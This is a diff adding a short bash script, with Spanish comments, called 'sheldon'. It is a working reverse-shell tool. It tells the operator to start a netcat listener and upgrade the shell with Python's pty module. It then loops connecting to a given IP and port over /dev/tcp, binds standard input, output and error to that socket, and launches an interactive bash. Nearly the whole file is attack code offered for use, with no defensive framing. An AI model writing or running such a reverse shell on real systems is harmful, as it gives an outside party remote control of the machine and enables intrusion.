@@ -1,0 +1,47 @@
+#!/bin/bash
+# forzar bash si el usuario lo ejecutó desde zsh/sh/etc
+[ -z "$BASH_VERSION" ] && exec /bin/bash "$0" "$@"
+
+#version en bash de sheldon-all-info en bash
+
+echo "version en bash de sheldon"
+
+ip="$1"
+[ -z "$ip" ] && echo "Uso: $0 <IP>" && exit 1
+
+cyan="\033[94m"; mag="\033[95m"; yellow="\033[93m"; green="\033[92m"; red="\033[91m"; reset="\033[0m"
+
+echo -e "${cyan}_________________________________________________________${reset}"
+echo -e "${mag}En la otra máquina ejecuta:${reset}"
+echo -e "${yellow}nc -nlvp 1234${reset}"
+
+echo -e "${yellow}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${reset}"
+echo -e "${yellow}export TERM=xterm${reset}"
+echo -e "${yellow}O tambien el binario listener${reset}"
+echo
+
+default_port=1234
+read -p "$(echo -e ${yellow}¿Default port 1234? [c] para cambiar:${reset} )" change
+if [[ "$change" == "c" ]]; then
+  read -p "$(echo -e ${yellow}Ingresa el puerto:${reset} )" port
+else
+  port=$default_port
+fi
+
+read -p "$(echo -e ${green}¿Ejecutar sheldon a $ip en el puerto $port? [S/n]:${reset} )" go
+[[ "$go" != "" && "$go" != "s" ]] && echo -e "${red}Operación cancelada.${reset}" && exit 0
+
+# aquí solo mostramos el comando REAL que se usa para conectar
+echo -e "${cyan}exec 3<>/dev/tcp/$ip/$port${reset}"
+echo -e "${mag}Esperando conexión...${reset}"
+
+# esperar/reintentar
+while true; do
+  exec 3<>"/dev/tcp/$ip/$port" 2>/dev/null && break
+  echo -ne "${yellow}no hay listener aún, reintentando...${reset}\r"
+  sleep 1
+done
+echo -e "\n${green}Conectado.${reset}"
+
+exec 0<&3 1>&3 2>&3
+exec /bin/bash -i
